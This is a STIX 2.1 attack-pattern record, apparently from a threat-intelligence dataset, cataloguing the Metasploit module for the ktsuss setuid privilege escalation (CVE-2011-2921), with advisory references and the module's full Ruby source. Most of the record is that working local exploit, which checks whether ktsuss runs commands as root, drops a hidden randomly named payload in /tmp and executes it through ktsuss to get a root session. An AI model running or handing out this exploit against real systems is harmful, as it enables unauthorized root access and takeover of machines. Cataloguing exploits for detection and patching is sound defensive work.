{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d16b2c13-495f-485c-8df0-d6dda72fe442",
    "created": "2024-08-14T16:59:18.99946Z",
    "modified": "2024-08-14T16:59:18.999463Z",
    "name": "ktsuss suid Privilege Escalation",
    "description": " This module attempts to gain root privileges by exploiting a vulnerability in ktsuss versions 1.4 and prior.  The ktsuss executable is setuid root and does not drop privileges prior to executing user specified commands resulting in command execution with root privileges.  This module has been tested successfully on:  ktsuss 1.3 on SparkyLinux 6 (2019.08) (LXQT) (x64); and ktsuss 1.3 on SparkyLinux 5.8 (LXQT) (x64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/ktsuss_suid_priv_esc.rb",
            "external_id": "ktsuss_suid_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2921"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2011/08/13/2"
        },
        {
            "source_name": "reference",
            "url": "https://security.gentoo.org/glsa/201201-15"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/local-exploits/blob/master/CVE-2011-2921/ktsuss-lpe.sh"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ktsuss suid Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges by exploiting\n          a vulnerability in ktsuss versions 1.4 and prior.\n\n          The ktsuss executable is setuid root and does not drop\n          privileges prior to executing user specified commands,\n          resulting in command execution with root privileges.\n\n          This module has been tested successfully on:\n\n          ktsuss 1.3 on SparkyLinux 6 (2019.08) (LXQT) (x64); and\n          ktsuss 1.3 on SparkyLinux 5.8 (LXQT) (x64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'John Lightsey', # Discovery and exploit\n          'bcoles'         # Metasploit\n        ],\n        'DisclosureDate' => '2011-08-13',\n        'References' => [\n          ['CVE', '2011-2921'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2011/08/13/2'],\n          ['URL', 'https://security.gentoo.org/glsa/201201-15'],\n          ['URL', 'https://github.com/bcoles/local-exploits/blob/master/CVE-2011-2921/ktsuss-lpe.sh']\n        ],\n        'Platform' => ['linux'],\n        'Arch' => [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Targets' => [['Auto', {}]],\n        'DefaultOptions' => {\n          'AppendExit' => true,\n          'PrependSetresuid' => true,\n          'PrependSetresgid' => true,\n          'PrependSetreuid' => true,\n          'PrependSetuid' => true,\n          'PrependFork' => true\n        },\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n    register_options [\n      OptString.new('KTSUSS_PATH', [true, 'Path to staprun executable', '/usr/bin/ktsuss'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def ktsuss_path\n    datastore['KTSUSS_PATH']\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def check\n    return CheckCode::Safe(\"#{ktsuss_path} file not found\") unless file? ktsuss_path\n    return CheckCode::Safe(\"#{ktsuss_path} is not setuid\") unless setuid? ktsuss_path\n\n    vprint_good \"#{ktsuss_path} is setuid\"\n\n    id = cmd_exec 'whoami'\n    res = cmd_exec(\"#{ktsuss_path} -u #{id} id\").to_s\n    vprint_status res\n\n    unless res.include? 'uid=0'\n      return CheckCode::Safe\n    end\n\n    CheckCode::Vulnerable\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    payload_name = \".#{rand_text_alphanumeric 10..15}\"\n    payload_path = \"#{base_dir}/#{payload_name}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    print_status 'Executing payload ...'\n    id = cmd_exec 'whoami'\n    res = cmd_exec \"#{ktsuss_path} -u #{id} #{payload_path} & echo \"\n    vprint_line res\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-08-13",
    "x_mitre_platforms": [
        "['linux']"
    ]
}